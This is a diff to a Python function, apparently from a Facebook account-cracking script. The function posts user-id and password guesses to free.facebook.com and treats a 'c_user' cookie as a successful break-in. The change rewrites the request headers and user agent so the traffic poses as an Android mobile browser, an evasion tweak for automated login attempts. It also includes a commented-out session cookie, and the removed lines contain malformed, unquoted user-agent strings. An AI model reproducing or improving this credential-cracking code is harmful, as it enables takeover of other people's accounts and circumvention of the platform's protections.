@@ -234,22 +234,21 @@ def rcrack1(uid,pwx,tl):
             header_freefb = {'authority': 'mbasic.facebook.com',
             "method": 'GET',
             "scheme": 'https',
-            'path':'/login/?li=SzDyYxLS203msIZ1guf5Hmm3&e=1348029&shbl=1&refsrc=deprecated&_rdr',
+            'path':'/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-US,en;q=0.9',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             # 'cookie': 'datr=hvvxY_hJhY1DbD3I_WQfeRLj; sb=h_vxYz7vCDIyiGLBzokl0PbZ; rbyWTlcXI=eyJ1YUluZm8iOnsidXNlcmFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTEuMDsgV09XNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjU0MTAuMTQ0IFNhZmFyaS81MzcuMzYiLCJlbmdpbmUiOiJibGluayIsIm9zVHlwZSI6IndpbmRvd3MiLCJicm93c2VyIjoiY2hyb21lIiwiYnJvd3NlclZlcnNpb24iOnsibWFqb3IiOjExMCwiZnVsbCI6IjExMC4wLjU0MTAuMTQ0In19fQ--',
-            'referer': 'https://mbasic.facebook.com/login/?li=SzDyYxLS203msIZ1guf5Hmm3&e=1348029&shbl=1&refsrc=deprecated&_rdr',
-            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="110", "Google Chrome";v="110"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
+            'referer': 'https://mbasic.facebook.com/',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent':Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0}
-            'user-agent':Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25}
+            'user-agent': 'Mozilla/5.0 (Android 6.0.1; Mobile; rv:43.0) Gecko/43.0 Firefox/43.0',}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
